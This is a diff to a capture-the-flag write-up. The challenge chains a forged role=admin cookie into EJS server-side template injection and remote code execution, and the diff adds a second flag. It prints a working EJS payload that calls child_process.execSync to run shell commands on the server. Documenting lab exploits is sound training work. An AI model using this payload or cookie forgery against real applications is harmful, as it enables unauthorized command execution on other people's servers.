@@ -2,6 +2,8 @@
 
 **Chain:** broken access control (client-trusted role) → server-side template injection (EJS) → RCE → flag.
 
+> Two flags — **FLAG1 (access):** the admin-only preview returns it once you forge `role=admin`. **FLAG2 (proof):** EJS SSTI gives RCE (`/proof.txt`).
+
 ## 1. Access control flaw
 `/preview` is "admins only":
 ```js
@@ -21,11 +23,11 @@ server-side JS = RCE.
 ## 3. RCE
 `process` is a Node global, so from inside an EJS tag:
 ```
-<%= process.mainModule.require('child_process').execSync('cat /flag.txt') %>
+<%= process.mainModule.require('child_process').execSync('cat /proof.txt') %>
 ```
 POST that as `template` with the `role=admin` cookie:
 ```
-→ FLAG{ejs_templates_run_server_side_js}
+→ FLAG2{ejs_ssti_executed_server_side}
 ```
 
 ## Fixes
